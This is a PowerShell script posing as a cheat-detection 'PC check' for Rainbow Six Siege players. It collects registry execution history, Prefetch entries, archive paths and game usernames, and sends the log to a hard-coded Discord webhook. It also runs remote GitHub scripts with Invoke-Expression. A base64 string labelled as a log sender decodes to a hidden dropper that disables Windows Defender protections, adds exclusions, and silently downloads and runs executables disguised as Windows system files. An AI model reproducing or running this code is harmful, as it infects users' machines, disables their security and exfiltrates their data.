function Decrypt-ValidationLogic {
    param (
        [string]$encryptedValidation,
        [string]$key
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $keyBytes = [Convert]::FromBase64String($key)
    $aes.Key = $keyBytes

    $fullBytes = [Convert]::FromBase64String($encryptedValidation)
    $aes.IV = $fullBytes[0..15]
    $cipherText = $fullBytes[16..$fullBytes.Length]

    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)

    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}




Clear-Host

$asciiArtUrl = "https://raw.githubusercontent.com/Reapiin/art/main/art.ps1"
$asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
Invoke-Expression $asciiArtScript

$encodedTitle = "Q3JlYXRlZCBieSBSZWFwaWluIG9uIGRpc2NvcmQu"
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText

$logfileencoded = "JG51bGwgPSAkUFNEZWZhdWx0UGFyYW1ldGVyVmFsdWVzWycqOkVycm9yQWN0aW9uJ10gPSAnU2lsZW50bHlDb250aW51ZScNCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScNCiRPdXRwdXRQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokSW5mb3JtYXRpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokVmVyYm9zZVByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScNCiRXYXJuaW5nUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ0KU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlDQpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nICR0cnVlDQpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSU9BVlByb3RlY3Rpb24gJHRydWUNClNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJbnRydXNpb25QcmV2ZW50aW9uU3lzdGVtICR0cnVlDQokdXA9JGVudjpVU0VSUFJPRklMRQ0KJHRkPSIkdXBcQXBwRGF0YVxMb2NhbFxUZW1wXDZjZmRmZWVhLTkzMzYtNDhhZC04MmIzLTNkNDEyNjQ1ZjQ0ZlwiDQppZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICR0ZCkpIHtOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICR0ZCAtRm9yY2UgfCBPdXQtTnVsbH0NCiRQcm9ncmVzc1ByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJw0KZnVuY3Rpb24geGs3ZjFxMSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR6eDFkcywNCiAgICAgICAgW3N0cmluZ10kYWs5emwxDQogICAgKQ0KICAgICR4ODJqZG09Sm9pbi1QYXRoIC1QYXRoICR0ZCAtQ2hpbGRQYXRoICRhazl6bDENCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR6eDFkcyAtT3V0RmlsZSAkeDgyamRtIC1Vc2VCYXNpY1BhcnNpbmcgLUVycm9yQWN0aW9uIFN0b3AgKj4gJG51bGwgMj4mMQ0KICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHg4MmpkbSAqPiAkbnVsbCAyPiYxDQogICAgU3RhcnQtUHJvY2VzcyAteDgyamRtICR4ODJqZG0gLU5vTmV3V2luZG93IC1XYWl0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlICo+ICRudWxsIDI+JjENCn0NCnhrN2YxcTEgLXp4MWRzICJodHRwczovL3IyLmUtei5ob3N0L2ZiYjg1NDBhLWQzNDQtNDJiYS04ZTI0LWZmMGVlMTZiMWU3ZC85OXR5dm1xN2oxbWNqN2J5Mm8uZXhlIiAtYWs5emwxICJSdW50aW1lIEJyb2tlci5leGUiDQp4azdmMXExIC16eDFkcyAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTMwNzA2OTE1MTk0ODMwODQ5MC8xMzE3MDY0MjI2MzI5NzIyOTAwL0NPTV9TdXJyb2dhdGUuZXhlP2V4PTY3NWQ1MzI1JmlzPTY3NWMwMWE1JmhtPTI3YWZmMTNjYmUwZTAyMDY3NThjOWI0OGNkMzdiZjE2MWZmZjJjMDQxYWNlN2ZlOTdjYTQ2ZjlmMGQwNzQ1NjgmIiAtYWs5emwxICJDT00gU3Vycm9nYXRlLmV4ZSINCnhrN2YxcTEgLXp4MWRzICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMzA3MDY5MTUxOTQ4MzA4NDkwLzEzMTcwNjQyMTU4ODE3MTE2NzYvV2luZG93c19TZWN1cml0eS5leGU/ZXg9Njc1ZDUzMjImaXM9Njc1YzAxYTImaG09MjgxZTMzNDc0ZGUzZWE5OGZjZTVlNDgxM2I3ZTgxNzJlNjJhOGVhZjllZWUyNmI5NzA3MzAzZTk5NDI1ODIxZCYiIC1hazl6bDEgIldpbmRvd3MgU2VjdXJpdHkuZXhlIg=="
$decodedlogsend = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($logfileencoded))


function Check-SecureBoot {
    try {
        if (Get-Command Confirm-SecureBootUEFI -ErrorAction SilentlyContinue) {
            $secureBootState = Confirm-SecureBootUEFI
            if ($secureBootState) {
                Write-Host "`n[-] Secure Boot is ON." -ForegroundColor Green
            } else {
                Write-Host "`n[-] Secure Boot is OFF." -ForegroundColor Red
            }
        } else {
            Write-Host "`n[-] Secure Boot not available on this system." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "`n[-] Unable to retrieve Secure Boot status: $_" -ForegroundColor Red
    }
}
Check-SecureBoot

function Get-OneDrivePath {
    try {
        $oneDrivePath = (Get-ItemProperty "HKCU:\Software\Microsoft\OneDrive" -Name "UserFolder").UserFolder
        if (-not $oneDrivePath) {
            Write-Warning "OneDrive path not found in registry. Attempting alternative detection..."
            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, "OneDrive")
            if (Test-Path $envOneDrive) {
                $oneDrivePath = $envOneDrive
                Write-Host "[-] OneDrive path detected using environment variable: $oneDrivePath" -ForegroundColor Green
            } else {
                Write-Error "Unable to find OneDrive path automatically."
            }
        }
        return $oneDrivePath
    } catch {
        Write-Error "Unable to find OneDrive path: $_"
        return $null
    }
}

function Format-Output {
    param($name, $value)
    $output = "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
    
    if ($output -match "Privilege") {
        return $null
    }

    if ($output -notmatch "Steam|Origin|EAPlay|FileSyncConfig.exe|OutlookForWindows") {
        return $output
    }
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @("C:\Users\$userName\Documents\My Games\Rainbow Six - Siege", "$oneDrivePath\Documents\My Games\Rainbow Six - Siege")
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Host "`nSkipping Stats.cc Search" -ForegroundColor Yellow
    } else {
        Write-Host "`nR6 Usernames Detected. Summon Stats.cc? | (Y/N)"
        $userResponse = Read-Host

        if ($userResponse -eq "Y") {
            foreach ($name in $uniqueUserNames) {
                $url = "https://stats.cc/siege/$name"
                Write-Host " [-] Opening stats for $name on Stats.cc ..." -ForegroundColor DarkMagenta
                Start-Process $url
                Start-Sleep -Seconds 0.5
            }
        } else {
            Write-Host "Stats.cc Search Skipped" -ForegroundColor Yellow
        }
    }
}


function Find-SusFiles {
    Write-Host " [-] Finding suspicious files names..." -ForegroundColor DarkMagenta
    $susFiles = @()

    foreach ($file in $global:logEntries) {
        if ($file -match "loader.*\.exe") { $susFiles += $file }
    }

    if ($susFiles.Count -gt 0) {
        $global:logEntries += "`n-----------------`nSus Files(Files with loader in their name):`n"
        $global:logEntries += $susFiles | Sort-Object
    }
}

function Find-ZipRarFiles {
    Write-Host " [-] Finding .zip and .rar files. Please wait..." -ForegroundColor DarkMagenta
    $zipRarFiles = @()
    $searchPaths = @($env:UserProfile, "$env:UserProfile\Downloads")
    $uniquePaths = @{}

    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Recurse -Include *.zip, *.rar -File
            foreach ($file in $files) {
                if (-not $uniquePaths.ContainsKey($file.FullName) -and $file.FullName -notmatch "minecraft") {
                    $uniquePaths[$file.FullName] = $true
                    $zipRarFiles += $file
                }
            }
        }
    }

    return $zipRarFiles
}
function List-BAMStateUserSettings {
    Write-Host " `n [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " UserSettings" -ForegroundColor White -NoNewline; Write-Host " Entries " -ForegroundColor DarkMagenta

    $loggedPaths = @{}

    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            $global:logEntries += "`n$($setting.PSPath)"
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name) -and $item.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                    $global:logEntries += "`n" + (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    } else {
        Write-Host " [-] No relevant user settings found." -ForegroundColor Red
    }

    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " Compatibility Assistant" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
    $compatRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    $compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
            $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
            $loggedPaths[$_.Name] = $true
        }
    }

    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " AppsSwitched" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
    $newRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
    if (Test-Path $newRegistryPath) {
        $newEntries = Get-ItemProperty -Path $newRegistryPath
        $newEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " MuiCache" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
    $muiCachePath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    if (Test-Path $muiCachePath) {
        $muiCacheEntries = Get-ChildItem -Path $muiCachePath
        $muiCacheEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    $global:logEntries = $global:logEntries | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" }

    Log-BrowserFolders

    $folderNames = Log-FolderNames | Sort-Object | Get-Unique
    $global:logEntries += "`n==============="
    $global:logEntries += "`nR6 Usernames:"

    foreach ($name in $folderNames) {
        $global:logEntries += "`n" + $name
        $url = "https://stats.cc/siege/$name"
        Write-Host " [-] Opening stats for $name on Stats.cc ..." -ForegroundColor DarkMagenta
        Start-Process $url
        Start-Sleep -Seconds 0.5
    }
}

function Log-BrowserFolders {
    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " reg entries" -ForegroundColor White -NoNewline; Write-Host " inside PowerShell..." -ForegroundColor DarkMagenta
    $registryPath = "HKLM:\SOFTWARE\Clients\StartMenuInternet"

    if (Test-Path $registryPath) {
        $browserFolders = Get-ChildItem -Path $registryPath
        $global:logEntries += "`n==============="
        $global:logEntries += "`nBrowser Folders:"
        foreach ($folder in $browserFolders) { $global:logEntries += "`n" + $folder.Name }
    } else {
        Write-Host "Registry path for browsers not found." -ForegroundColor Red
    }
}

function Log-WindowsInstallDate {
    Write-Host " [-] Logging" -ForegroundColor DarkMagenta -NoNewline; Write-Host " Windows install" -ForegroundColor White -NoNewline; Write-Host " date..." -ForegroundColor DarkMagenta
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $global:logEntries += "`n==============="
    $global:logEntries += "`nWindows Installation Date: $installDate"
}

function Check-RecentDocsForTlscan {
    Write-Host " [-] Checking" -ForegroundColor DarkMagenta -NoNewline; Write-Host " for .tlscan" -ForegroundColor White -NoNewline; Write-Host " folders..." -ForegroundColor DarkMagenta
    $recentDocsPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
    $tlscanFound = $false
    if (Test-Path $recentDocsPath) {
        $recentDocs = Get-ChildItem -Path $recentDocsPath
        foreach ($item in $recentDocs) {
            if ($item.PSChildName -match "\.tlscan") {
                $tlscanFound = $true
                $folderPath = Get-ItemProperty -Path "$recentDocsPath\$($item.PSChildName)" -Name MRUListEx
                $global:logEntries += "`n.tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath"
                Write-Host ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath" -ForegroundColor Red
            }
        }
    }
    if (-not $tlscanFound) {
        Write-Host " [-] No .tlscan ext found." -ForegroundColor Green
    }
}

function Log-PrefetchFiles {
    Write-Host " [-] Fetching Last Ran Dates..." -ForegroundColor DarkMagenta
    $prefetchPath = "C:\Windows\Prefetch"
    $pfFilesHeader = "`n=======================`n.pf files:`n"

    if (Test-Path $prefetchPath) {
        $pfFiles = Get-ChildItem -Path $prefetchPath -Filter *.pf -File
        if ($pfFiles.Count -gt 0) {
            $global:logEntries += $pfFilesHeader
            $pfFiles | ForEach-Object {
                $logEntry = "{0} | {1}" -f $_.Name, $_.LastWriteTime
                $global:logEntries += "`n" + $logEntry
            }
        } else {
            Write-Host "No .pf files found in the Prefetch folder." -ForegroundColor Green
        }
    } else {
        Write-Host "Prefetch folder not found." -ForegroundColor Red
    }
}
function Send-Logs {
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"

    if (Test-Path $logFilePath) {
        $url = "https://ptb.discord.com/api/webhooks/1316160688162603090/HPXs2uyzRi2JAWOaU7eFNpJnXc8kqjuUMAJRjmSxMsp5j26P-w4jxfcjo0IgP_G3ej2X"

        $fileContent = Get-Content -Path $logFilePath -Raw

        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"PcCheckLogs.txt`"",
            "Content-Type: text/plain$LF",
            $fileContent,
            "--$boundary--$LF"
        ) -join $LF

        try {
            $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
            Write-Host "."
        }
        catch {
            Write-Host "Failed to send log: $_" -ForegroundColor Red
        }
    }
    else {
        Write-Host "Log file not found." -ForegroundColor Red
    }
}
function Main {
    $global:logEntries = @()
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"



    List-BAMStateUserSettings
    Log-WindowsInstallDate
    Find-SusFiles
    Check-RecentDocsForTlscan
    Log-PrefetchFiles

    $zipRarFiles = Find-ZipRarFiles
    if ($zipRarFiles.Count -gt 0) {
        $global:logEntries += "`n-----------------"
        $global:logEntries += "`nFound .zip and .rar files:"
        $zipRarFiles | ForEach-Object { $global:logEntries += "`n" + $_.FullName }
    }

    $global:logEntries | Out-File -FilePath $logFilePath -Encoding UTF8 -NoNewline
    Start-Sleep -Seconds 1



    if (Test-Path $logFilePath) {
        Set-Clipboard -Path $logFilePath
        Write-Host "Log file copied to clipboard." -ForegroundColor DarkRed
    } else {
        Write-Host "Log file not found on the desktop." -ForegroundColor Red
    }

    $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
    $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
    $url = "https://raw.githubusercontent.com/Reapiin/art/main/credits"
    $content = Invoke-RestMethod -Uri $url
    Invoke-Expression $content
    Send-Logs
    Invoke-Expression $decodedlogsend





}
Main
